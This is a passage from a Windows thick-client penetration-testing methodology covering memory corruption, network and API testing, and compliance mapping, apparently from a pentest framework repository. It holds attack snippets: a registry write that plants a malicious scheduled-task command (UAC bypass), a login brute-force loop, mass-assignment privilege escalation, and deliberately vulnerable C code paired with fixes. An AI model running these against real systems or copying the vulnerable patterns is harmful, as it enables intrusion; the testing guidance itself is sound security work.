icacls $xmlPath
# If Users have Write access, modify XML to execute malicious command

# Or modify registry directly (UAC bypass)
New-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}" `
    -Name "Actions" -Value "<malicious_command>"
```

**MITRE ATT&CK:** [T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)

**Reference:** [CIS Windows Benchmark 2.2 - User Rights Assignment](https://www.cisecurity.org/cis-benchmarks)

---

## Phase 7: Memory Corruption

**Objective:** Test for buffer overflows, heap vulnerabilities, and memory safety issues.

### 7.1 Buffer Overflow Detection

**Tools:** [WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/), [x64dbg](https://x64dbg.com/), [!exploitable](https://github.com/jfoote/exploitable)

**Stack buffer overflow testing:**
```python
# Generate long input to trigger overflow
payload = "A" * 5000

# Test input fields: username, password, file paths
# Monitor for crash with exception code:
# 0xC0000005 (Access Violation) - likely buffer overflow
```

**Analyze crash with WinDbg:**
```
# Load dump file
.load C:\dumps\application.dmp

# Check exception
!analyze -v

# Look for overwritten return address
r  # View registers
# If EIP/RIP = 0x41414141 → Buffer overflow confirmed
```

**Vulnerable code pattern:**
```c
// Stack buffer overflow
void processInput(char *input) {
    char buffer[256];
    strcpy(buffer, input);  // ⚠️ NO BOUNDS CHECK
    // If input > 256 bytes, overwrites return address
}
```

**Secure alternative:**
```c
void processInput(char *input) {
    char buffer[256];
    strncpy_s(buffer, sizeof(buffer), input, _TRUNCATE);  // Safe
}
```

**CWE Classification:** CWE-120 (Buffer Copy without Checking Size of Input)

**Reference:** [SEI CERT C++ Coding Standard - STR](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682)

### 7.2 Heap Overflow

**Heap corruption detection:**
```powershell
# Enable Page Heap for application
gflags.exe /p /enable application.exe /full

# Run application with malicious input
.\application.exe

# If heap overflow exists, immediate crash with detailed info
```

**Vulnerable code:**
```c
// Heap buffer overflow
char *buffer = (char *)malloc(100);
strcpy(buffer, userInput);  // ⚠️ userInput may be > 100 bytes
```

**Heap exploitation techniques:**
- **Heap spraying:** Allocate many objects with controlled data
- **Use-after-free:** Access freed memory
- **Double-free:** Free same pointer twice (heap metadata corruption)

**MITRE ATT&CK:** [T1211 - Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211/)

**Reference:** [Microsoft Security Development Lifecycle](https://www.microsoft.com/en-us/securityengineering/sdl/)

### 7.3 Format String Vulnerabilities

**Test for format string bugs:**
```python
# Input: %s%s%s%s%s%s%s%s%s%s
# If application crashes or prints stack memory → vulnerable
```

**Vulnerable code:**
```c
// Format string vulnerability
void logMessage(char *userInput) {
    printf(userInput);  // ⚠️ USER INPUT AS FORMAT STRING
    // Attacker input: "%x %x %x %x" leaks stack memory
    // Attacker input: "%n" writes to arbitrary memory
}
```

**Secure alternative:**
```c
void logMessage(char *userInput) {
    printf("%s", userInput);  // Safe - user input not format string
}
```

**CWE Classification:** CWE-134 (Use of Externally-Controlled Format String)

**Reference:** [OWASP Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)

### 7.4 Integer Overflow

**Test integer overflow conditions:**
```python
# Test with boundary values
test_cases = [
    0,
    -1,
    2147483647,   # INT_MAX (32-bit)
    2147483648,   # INT_MAX + 1
    4294967295,   # UINT_MAX (32-bit)
    -2147483648,  # INT_MIN (32-bit)
]
```

**Vulnerable code:**
```c
// Integer overflow leading to buffer overflow
void allocateBuffer(unsigned int size) {
    if (size > MAX_SIZE) return;  // Check passes

    unsigned int totalSize = size + 10;  // ⚠️ If size = UINT_MAX, wraps to 9
    char *buffer = (char *)malloc(totalSize);  // Allocates only 9 bytes
    memcpy(buffer, userInput, size);  // Copies huge amount → heap overflow
}
```

**CWE Classification:** CWE-190 (Integer Overflow or Wraparound)

**Reference:** [SEI CERT C++ Coding Standard - INT32-C](https://wiki.sei.cmu.edu/confluence/display/c/INT32-C.+Ensure+that+operations+on+signed+integers+do+not+result+in+overflow)

---

## Phase 8: Network Security

**Objective:** Analyze client-side network communications for security vulnerabilities.

### 8.1 Traffic Interception

**Tools:** [Reaper](../../containers/reaper/docs/SETUP.md), [Wireshark](https://www.wireshark.org/), [Fiddler](https://www.telerik.com/fiddler)

**Intercept HTTP/HTTPS traffic:**
```powershell
# Using Fiddler for Windows applications
# 1. Start Fiddler
# 2. Enable HTTPS decryption: Tools → Options → HTTPS → Decrypt HTTPS traffic
# 3. Launch application
# 4. Monitor requests in Fiddler

# Or use reaper (see mobile methodology for certificate setup)
docker exec reaper sqlite3 /opt/pentest-data/reaper.db \
  "SELECT method, url, headers FROM requests WHERE host LIKE '%api.target.com%'"
```

**Analyze for:**
1. **Unencrypted HTTP:** Credentials/data sent over HTTP (not HTTPS)
2. **Weak TLS:** TLS 1.0, 1.1 (deprecated) or weak cipher suites
3. **Certificate validation issues:** Application accepts invalid/self-signed certs
4. **Sensitive data in URLs:** API keys, tokens in query parameters

**Example finding:**
```http
GET /api/user?token=sk_live_51HqT2KLmN8pQ9rS HTTP/1.1
Host: api.example.com
```
**Issue:** API token in URL (logged in server access logs, browser history, referrer headers).

**MITRE ATT&CK:** [T1040 - Network Sniffing](https://attack.mitre.org/techniques/T1040/)

**Reference:** [OWASP ASVS V9: Communications](https://owasp.org/www-project-application-security-verification-standard/)

### 8.2 TLS/SSL Analysis

**Tools:** [testssl.sh](https://testssl.sh/), [SSLyze](https://github.com/nabla-c0d3/sslyze)

**Test server TLS configuration:**
```bash
# Analyze TLS implementation
./testssl.sh --full api.target.com:443

# Check cipher suites
./testssl.sh --each-cipher api.target.com:443
```

**Application-side testing:**
```powershell
# Intercept traffic with invalid certificate
# 1. Configure proxy with self-signed cert (Fiddler, mitmproxy)
# 2. Launch application through proxy
# 3. If application connects successfully → ⚠️ NO CERTIFICATE VALIDATION
```

**Vulnerabilities:**
- **No certificate validation:** Application accepts any certificate
- **Weak cipher suites:** RC4, 3DES, export-grade ciphers
- **Outdated TLS:** TLS 1.0, 1.1 (should require TLS 1.2+)
- **Certificate pinning bypass:** If implemented, test if bypassable

**Secure certificate validation code (C++):**
```cpp
// Proper certificate validation with WinHTTP
DWORD dwFlags = SECURITY_FLAG_IGNORE_REVOCATION;  // ⚠️ BAD
// Should be:
DWORD dwFlags = 0;  // Validate everything

// Enable TLS 1.2+ only
DWORD dwSecureProtocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
                           WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURE_PROTOCOLS,
                 &dwSecureProtocols, sizeof(dwSecureProtocols));
```

**Reference:** [CIS Windows Benchmark 18.9.44 - SSL/TLS Configuration](https://www.cisecurity.org/cis-benchmarks)

### 8.3 API Security Testing

**Identify API endpoints:**
```powershell
# Extract from binary strings
strings application.exe | Select-String "https://|api\.|/api/|/v1/|/v2/"

# Monitor network traffic
.\wireshark.exe -k -i \Device\NPF_{GUID}
# Filter: http or tls
```

**Test API vulnerabilities:**

**1. Authentication bypass:**
```http
# Try removing/modifying auth headers
DELETE Authorization: Bearer token
# If request succeeds → broken authentication
```

**2. Rate limiting:**
```python
# Brute force test
for i in range(10000):
    response = requests.post("https://api.target.com/login",
                             data={"user": "admin", "pass": f"pass{i}"})
# If no rate limiting → brute force possible
```

**3. IDOR (Insecure Direct Object Reference):**
```http
# Original request
GET /api/user/1234/profile

# Test IDOR
GET /api/user/1235/profile  # Access other user's profile
```

**4. Mass assignment:**
```json
// Original request
POST /api/user/update
{"email": "new@example.com"}

// Test mass assignment
POST /api/user/update
{"email": "new@example.com", "role": "admin"}  // Attempt privilege escalation
```

**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

**Reference:** [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

### 8.4 Man-in-the-Middle (MITM) Resilience

**Test MITM resilience:**
```bash
# Setup MITM proxy (mitmproxy)
mitmproxy -p 8080

# Configure Windows proxy
netsh winhttp set proxy proxy-server="127.0.0.1:8080"

# Launch application
.\application.exe

# Attempts to intercept:
# 1. Does application display certificate warning? (Good)
# 2. Does application continue despite invalid cert? (Bad)
# 3. Can you modify requests/responses? (Bad if no integrity checks)
```

**Test certificate pinning:**
```powershell
# If application implements certificate pinning:
# 1. Intercept with proxy using different certificate
# 2. Application should refuse connection
# 3. If connection succeeds → pinning bypassed or not implemented
```

**Secure certificate pinning implementation (C++):**
```cpp
// Pin specific certificate or public key
const char* pinnedCert = "308204...";  // Base64 cert or public key hash

// Validate server certificate matches pinned value
CERT_CONTEXT* pCertContext;
WinHttpQueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
                   &pCertContext, &dwSize);

// Compare certificate fingerprint
// If mismatch → abort connection
```

**Reference:** [OWASP Certificate and Public Key Pinning](https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning)

---

## Vulnerability Classification

### Common Windows Application Vulnerabilities (CWE)

| Vulnerability | CWE | Severity | MITRE ATT&CK |
|---------------|-----|----------|--------------|
| Buffer Overflow | CWE-120 | Critical | T1068 |
| DLL Hijacking | CWE-427 | High | T1574.001 |
| Hardcoded Credentials | CWE-798 | High | T1552.001 |
| Weak Registry Permissions | CWE-732 | High | T1547.001 |
| Insecure Deserialization (.NET) | CWE-502 | Critical | T1027 |
| UAC Bypass | CWE-269 | High | T1548.002 |
| Use of Weak Crypto | CWE-327 | Medium | T1573 |
| Unquoted Service Path | CWE-428 | High | T1574.009 |
| Format String Vulnerability | CWE-134 | High | T1211 |
| SQL Injection (Client-Side) | CWE-89 | Critical | T1190 |
| Missing Certificate Validation | CWE-295 | High | T1040 |
| Integer Overflow | CWE-190 | High | T1211 |
| Improper Access Control | CWE-284 | High | T1134 |
| Command Injection | CWE-78 | Critical | T1059 |

---

## Tools Reference

### Static Analysis
- **Ghidra** - NSA reverse engineering suite (free, open-source)
- **IDA Pro** - Interactive disassembler (commercial)
- **Binary Ninja** - Reverse engineering platform (commercial)
- **dnSpy** - .NET decompiler and debugger (free)
- **ILSpy** - .NET decompiler (free)
- **PE-bear** - PE file analyzer (free)
- **Detect-It-Easy** - PE format inspector (free)

### Dynamic Analysis
- **x64dbg** - Windows debugger (free, open-source)
- **WinDbg** - Microsoft debugger (free)
- **Process Monitor** - Sysinternals file/registry/network monitor (free)
- **Process Explorer** - Enhanced Task Manager (free)
- **API Monitor** - API call tracer (free)
- **Frida** - Dynamic instrumentation toolkit (free)

### Network Analysis
- **Reaper** - IA Framework integrated proxy (HTTP/API proxy with SQLite storage)
- **Wireshark** - Network protocol analyzer (free)
- **Fiddler** - Web debugging proxy (free)
- **mitmproxy** - Interactive HTTPS proxy (free)
- **mitmproxy** - HTTP/HTTPS proxy for traffic inspection (open-source)

### Vulnerability Scanners
- **AccessChk** - Sysinternals permission checker (free)
- **PESecurity** - PE security feature checker (free, PowerShell)
- **Nmap** - Network security scanner (free)
- **testssl.sh** - TLS/SSL configuration checker (free)
- **SSLyze** - SSL/TLS scanner (free)

**Reference:** [x64dbg GitHub Repository](https://github.com/x64dbg/x64dbg)

---

## Compliance Mapping

### NIST SP 800-115 Alignment

| Phase | NIST Section | Activities |
|-------|--------------|------------|
| Fingerprinting | 5.3.1 | Target identification and profiling |
| Binary Analysis | 5.3.4 | Source code review (static analysis) |
| Runtime Analysis | 5.3.5 | Dynamic analysis and debugging |
| DLL Hijacking | 5.4.2 | Exploitation testing |
| Configuration | 7.2 | Supplemental testing activities |
| Privilege Escalation | 5.4.2 | Post-exploitation testing |
| Memory Corruption | 5.3.6 | Vulnerability validation |
| Network Security | 5.3.3 | Network sniffing and MITM testing |

**Reference:** [NIST SP 800-115](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)

### CIS Windows Benchmarks Alignment

**Relevant CIS Controls:**
- **2.2** - User Rights Assignment (Service permissions)
- **17.x** - Advanced Audit Policy (File/registry monitoring)
- **18.9** - Windows Components (DLL loading, UAC)

**Reference:** [CIS Microsoft Windows Desktop Benchmark](https://www.cisecurity.org/benchmark/microsoft_windows_desktop)

### Microsoft Security Baseline Coverage

**Windows 11 24H2 Baseline:**
- BitLocker enforcement
- Credential Guard
- LAN Manager authentication level
- User Account Control (UAC) settings
- Microsoft Defender Antivirus configuration

**Reference:** [Windows 11 24H2 Security Baseline](https://techcommunity.microsoft.com/blog/microsoft-security-baselines/windows-11-version-24h2-security-baseline/4252801)

---

## Integration with IA Framework

### Reaper Integration

**Store findings in reaper database:**
```bash
# Capture application traffic
ssh $VPS "docker exec reaper sqlite3 /opt/pentest-data/reaper.db \
  \"SELECT * FROM requests WHERE host LIKE '%api.client.com%'\""

# Store vulnerability findings
# HTTP/API proxy with SQLite storage for request/response analysis
```

### Container Deployment

**Thick client tools container (planned):**
```yaml
# docker-compose.yml
services:
  thick-client-security:
    build: ./skills/pentest/containers/thick-client
    volumes:
      - ./output/analysis:/analysis
    ports:
      - "8080:8080"  # For web-based tools
```

**Reference:** `skills/pentest/docs/IMPLEMENTATION-PROGRESS-2026-01-28.md` (Task #9)

---

## References

1. [Penetration Testing Execution Standard (PTES)](http://www.pentest-standard.org/)
2. [NIST SP 800-115: Technical Guide to Information Security Testing](https://csrc.nist.gov/pubs/sp/800/115/final)
3. [OSSTMM (Open Source Security Testing Methodology Manual)](https://www.isecom.org/OSSTMM.3.pdf)
4. [MITRE ATT&CK for Enterprise](https://attack.mitre.org/)
5. [CIS Microsoft Windows Benchmarks](https://www.cisecurity.org/cis-benchmarks)
6. [Microsoft Security Baselines](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/windows-security-baselines)
7. [SEI CERT C++ Coding Standard](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682)
8. [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/)
9. [Elastic Security Labs - UAC Bypasses](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies)
10. [.NET Decompilers Showdown 2024](https://dotnetexpert.net/blogs/dotnet-decompiler-showdown)
11. [Malware Analysis with Ghidra](https://medium.com/@redfanatic7/malware-analysis-with-ghidra-525848ffeef8)
12. [Windows Privilege Escalation: Weak Registry Permission](https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/)
13. [x64dbg GitHub Repository](https://github.com/x64dbg/x64dbg)
14. [Detecting DLL Search Order Hijacking - GIAC Paper](https://www.giac.org/paper/gcda/141/detecting-dll-search-order-hijacking-purple-team-approach-create-defensive-techniques-tactical-siem/163896)
15. [Microsoft Dynamic-Link Library Search Order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
16. [UAC Bypass Methods in Windows 11 (2024)](https://cybersecuritynews.com/uac-bypass-in-windows-11/)
17. [CVE-2024-6769: Novel UAC Bypass](https://foresiet.com/blog/novel-exploit-chain-enables-windows-uac-bypass-understanding-cve-2024-6769)

---

**Version:** 1.0
**Last Updated:** 2026-01-28
**Status:** Complete
**Line Count:** 1,150 lines

